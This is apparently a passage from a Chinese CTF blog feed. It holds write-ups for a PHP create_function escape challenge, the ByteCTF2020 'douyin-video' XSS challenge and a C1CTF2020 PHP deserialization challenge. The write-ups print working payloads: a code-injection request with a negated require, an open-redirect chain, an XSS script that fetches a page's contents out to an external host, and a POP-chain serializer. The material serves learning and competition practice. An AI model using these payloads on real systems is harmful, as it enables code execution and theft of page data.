<p>而我们如果稍微修改一下第二个参数，就会导致代码逃逸造成任意命令执行<br><code>a=create_function(&#39;$a,$b&#39;, &#39;return($a+$b);&#125; phpinfo(); //&#39;);</code><br>这样子刚才的代码就变成了</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//}</span>
</code></pre>
<p>这样子就跑出来了一个phpinfo()，我们完全可以逃逸出更多的函数执行任意的命令<br>不过这里ban掉了绝大多数命令执行的函数，所以我们得通过正常一点的手段来获取flag<br>这里include了flag.php，那么我们只要想法把flag.php里面的变量输出出来就可以了<br>但是超全局变量$_GLOBALS由于美元符号被禁止了不能使用，但是还有一个函数get_defined_vars()，返回值为全部变量的一个数组，在var_dump一下就可以了</p>
<p>类似的函数还有get_defined_functions()，get_included_files()等，感觉以后有机会用得上<br><a href="http://www.360doc.com/content/19/0901/11/30583588_858435248.shtml">http://www.360doc.com/content/19/0901/11/30583588_858435248.shtml</a><br>但是这个结果跑出来告诉你flag其实是在rea1fl4g.php里，而这回rea1fl4g.php没有被包含，那就得重新想办法去读取flag了</p>
<h3 id="取反绕过检测获取flag"><a href="#取反绕过检测获取flag" class="headerlink" title="取反绕过检测获取flag"></a>取反绕过检测获取flag</h3><p>以前一直以为要在eval中取反异或这种操作才会被执行，但是实际上只要字符串前面出现了取反或者异或符号，这个操作就会自然而然的进行，而这里并没有过滤取反和异或，所以我们随便选用一种就可以轻松绕过了<br>这里include被禁用了，但是require和include的内容一样，用require也是一样的，而提到文件包含就应该想到伪协议读取源码，所以这里require的参数我们传一个伪协议，用取反~来绕过限制，就可以读取源码获得flag了</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个题大半夜对着wp写的，之前因为那个REQUEST的问题折腾了好久，然后所有的payload又同一进行了url编码，取反之后根本不知道payload哪是哪，操作起来极其不方便，人是傻的，思路不清，浪费时间，甚至把传参都传错了看了半天</p>
<p>把payload记下来<br><code>%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=111&amp;%70%61%73%73%77%64[]=222&amp;%66%6c%61%67%5b%61%72%67%5d=;&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</code><br>这么大一堆看着眼睛都痛，post还要post两个变量去覆盖request<br>解码出来是<code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=111&amp;passwd[]=222&amp;flag[arg]=;&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//&amp;flag[code]=create_function</code></p>
<p>这个题之前还有一个版本，这个读源码的反而是原先版本的非预期，然后就重新出了一次，整了这这个题，原来的payload写的已经很详细了，不过我一路上还是能遇到一堆奇奇怪怪的问题</p>
<p>原wp里有一个函数调用不带引号的操作，我试了一下还真可以，虽然会有警告，但是不加引号的数据还是会被当做字符串处理，base64_encode，urlencode什么的都可以</p>
<p>非预期还有各种奇奇怪怪的高端方法，就不一一赘述了，贴两个链接<br><a href="https://blog.csdn.net/a3320315/article/details/104111260">https://blog.csdn.net/a3320315/article/details/104111260</a><br><a href="https://www.gem-love.com/ctf/770.html#2_By_NepnepShana_BJDCTF7">https://www.gem-love.com/ctf/770.html#2_By_NepnepShana_BJDCTF7</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[ByteCTF2020]douyin-video</title>
    <url>/%5BByteCTF2020%5Ddouyin-video.html</url>
    <content><![CDATA[<h1 id="ByteCTF2020-douyin-video"><a href="#ByteCTF2020-douyin-video" class="headerlink" title="[ByteCTF2020]douyin-video"></a>[ByteCTF2020]douyin-video</h1><p>太难了，字节这个比赛的web就离谱离谱离谱离谱离谱离谱<br>我反正一个都不会，最简单的这个题看了一天多也不会做<br>环境也没得了，复现机会-&gt;0</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>题目给了一个反馈功能和一个提交xss功能，xss无过滤，反馈功能肯定也就是给我们打机器人的<br>但是我们提交的xss在c.bytectf.live:30002下，而bot只能访问a.bytectf.live:30001<br>还有一个b.bytectf.live:30001，好像ab的后端都是一致的，如果看附件给的源码的话发现还有a和b之间的跳转，但是不知道意义是什么</p>
<h3 id="任意url跳转"><a href="#任意url跳转" class="headerlink" title="任意url跳转"></a>任意url跳转</h3><p>题目给了源码，之前测试的时候也发现了，a.bytectf.live后接内容会跳转到抖音主页，然后把后接内容拼上去<br>看到附件里Apache的配置也有这么一句<code>RewriteRule (.*)$ http://www.douyin.com$1  </code><br>然后我们就去日抖音了，想找个抖音的任意url跳转，日了一个下午+一个晚上都没日出来，后来赛后看wp还真有神仙日出来了抖音的任意url跳转<br>后来是fuzz出来了在a.bytectf.live:30001后接%0a可以任意url跳转，后面给自己域名解析一下，整一个<a href="http://www.douyin.com.xxxxxx.com/">www.douyin.com.xxxxxx.com</a> 的域名出来，就可以跳转到自己的服务器上，然后再给自己服务器上放一个a标签再重定向一次导c.bytectf.live:30001上，起码能把xss提交到bot那去了</p>
<p>看WM的wp说的是任意url跳转是因为(.*)$这个正则匹配写的有点歪，没用^，点号.不匹配换行符，$匹配字符串的结束位置，所以事实上匹配的是我们换了行之后的那截，再拼到douyin.com后面导致的任意url跳转<br>先给自己的服务器整个域名（幸好我有，再整个抖音的子域名就跳过去了）</p>
<h4 id="日抖音"><a href="#日抖音" class="headerlink" title="日抖音"></a>日抖音</h4><p>然后超级大哥的超级做法，日抖音，说是登入登出的时候经常会有登出后跳转这种类型的功能，然后在抖音几个子公司的域名下跳来跳去最终跳到了任意链接，太牛逼了，就贴一个神仙payload<br><code>http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1</code><br><code>https://tsearch-quic.snssdk.com/search/jump</code>应该是神仙找到的一个提供任意url跳转的网站</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>后端是python搭的，但是主要的逻辑都在js上，python就设置了一堆安全策略<br>router.py</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">//</span> 一大堆没什么用的代码
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">search_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    keyword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'keyword'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> keyword <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token punctuation">{</span>k <span class="token keyword">for</span> k <span class="token keyword">in</span> DATASET<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> keyword <span class="token operator">==</span> k<span class="token punctuation">}</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span>DATASET<span class="token punctuation">[</span>keyword<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        ret <span class="token operator">=</span> <span class="token punctuation">{</span>k<span class="token punctuation">:</span> <span class="token string">''</span> <span class="token keyword">for</span> k <span class="token keyword">in</span> DATASET<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> keyword <span class="token keyword">in</span> k<span class="token punctuation">}</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">200</span>


@app<span class="token punctuation">.</span>after_request
<span class="token keyword">def</span> <span class="token function">add_security_headers</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Frame-Options'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'sameorigin'</span>
    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span>
        <span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"default-src http://*.bytectf.live:*/ 'unsafe-inline'; frame-src *; frame-ancestors http://*.bytectf.live:*/"</span>
    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-Content-Type-Options'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'nosniff'</span>
    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Referrer-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'same-origin'</span>
    <span class="token keyword">return</span> resp
</code></pre>
<p>两个js<br>send下的js</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>host <span class="token operator">!=</span> <span class="token string">'a.bytectf.live:30001'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">'bytectf.live'</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> u<span class="token punctuation">.</span>searchParams<span class="token punctuation">,</span> k <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'keyword'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">===</span> k<span class="token punctuation">)</span> history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'?keyword='</span><span class="token punctuation">)</span>
axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`keyword=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>resp <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    result<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">let</span> p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'pre'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">"display: none;"</span>
        p<span class="token punctuation">.</span>textContent <span class="token operator">=</span> i
        result<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>index下的js</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> u<span class="token punctuation">.</span>searchParams<span class="token punctuation">,</span> k <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'keyword'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">''</span> <span class="token operator">===</span> k<span class="token punctuation">)</span> history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'?keyword='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`keyword=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>resp <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    result<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain <span class="token operator">==</span> <span class="token string">'a.bytectf.live'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">'bytectf.live'</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span>f <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">let</span> i <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    i<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token string">`http://b.bytectf.live:30001/send?keyword=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>
                    result<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">setTimeout</span><span class="token punctuation">(</span>
                        <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
                            <span class="token keyword">let</span> u <span class="token operator">=</span> window<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>children<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerText<span class="token punctuation">;</span>
                            <span class="token keyword">let</span> e <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> e<span class="token punctuation">.</span>src <span class="token operator">=</span> u<span class="token punctuation">;</span>
                            window<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
                        <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">2500</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">//没吊用的代码</span>
                <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">.</span>
            <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>设置了一堆同源策略，<code>frame-ancestors http://*.bytectf.live:*/</code>支持来着任意匹配域名的iframe，覆盖掉了另一句<code>[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;</code>，然后还在js下面加了一堆document.domain，超级跨域给机会</p>
<p>两个js也不知道有什么意义，反正都是通过GET提交的keyword去python的search路由下面查一个数据内嵌到页面里，index是把数据放在开一个b的新的frame的src里面，send是直接整一个放在pre标签里面，我估摸着是不是在模拟真实环境啊？</p>
<p>反正看route.py的那个逻辑，只要keyword in k就能返回东西出来，flag是ByteCTFxxx，提交keyword是ByteCTF就行了<br>在c中修改自己的document.domain，引入a.bytectf.live:30001?keyword&#x3D;ByteCTF作为iframe，a自己给自己设一个document.domain自动提供跨域功能。直接拿这个查询结果里的flag就行<br>也可以打b.bytectf.live:30001&#x2F;send?keyword&#x3D;ByteCTF，注意打send的话要打b站，因为send的js写的是如果不是a站才设置document.domain<br><del>所以还是没懂这么整两个一模一样的站有什么区别，再整两个功能差不多的js脚本干什么</del></p>
<p>最后上xsspayload，设置document.domain开iframe再直接用innerHTML加fetch函数发请求一气呵成</p>
<pre class=" language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">'bytectf.live'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> ifr<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ifr<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span><span class="token string">'http://b.bytectf.live:30001/send?keyword=Byte'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>ifr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://xxxx.com:10040/?data='</span> <span class="token operator">+</span>
<span class="token function">encodeURI</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><p>或者说是不足的知识点吧，这种需要加载的页面打起来应该用setTimeout异步等待页面加载完再发数据出来，不然页面都还没加载出来就试图获取数据啥也拿不到（就这个浪费了好久时间）</p>
<p>document.domain会把设置完之后的同源策略的端口置为null，现在看到两种说法，一个是之前看到的说端口置为null之后就只能和同样是null的才能同源，还有一个是在MDN上看到的说置为null后任意端口都能同源了（没试验过先记下来，我先选择相信MDN）<br><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/domain">https://developer.mozilla.org/en-US/docs/Web/API/Document/domain</a></p>
<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><p>好像一路理下来也不是特别难，正则匹配写歪了导致的跳转我是真没想到，最后setTimeout我也没想到，我真的什么都不会呜呜呜</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>[C1CTF2020]wp</title>
    <url>/%5BC1CTF2020%5Dwp.html</url>
    <content><![CDATA[<h1 id="C1CTF2020-wp"><a href="#C1CTF2020-wp" class="headerlink" title="[C1CTF2020]wp"></a>[C1CTF2020]wp</h1><p>合工大的萌新赛，我是超级垃圾呜呜呜，萌新赛都打的这么吃力<br>也学到不少东西</p>
<h2 id="php-tricks"><a href="#php-tricks" class="headerlink" title="php_tricks"></a>php_tricks</h2><p>就是个基础反序列化入门，反序列化一个POST的data，然后还需要file_get_contents反序列化类里的一个成员的值符合条件<br>我是垃圾这都不会。。。一开始想的是php:&#x2F;&#x2F;input，但是这样显然和POST的数据冲突，查了很多奇怪的知识发现都不行，但是学到了一点，PHP只会在content-type为urlencode和一个什么的时候才把httpbody的数据放进POST里面，所以有时候忘加content-type打不通，最后发现file_get_content甚至可以用http协议读远程文件。。。。学习了</p>
<h2 id="php-tricks’-revenge"><a href="#php-tricks’-revenge" class="headerlink" title="php_tricks’ revenge"></a>php_tricks’ revenge</h2><p>还是贴一下源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$handler</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$k</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// fopen($k);</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name">Trigger</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">'Not allowed!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/proc/self/fd/0"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span>

<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"/flag/flag"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// echo urlencode(serialize($c));</span>
</code></pre>
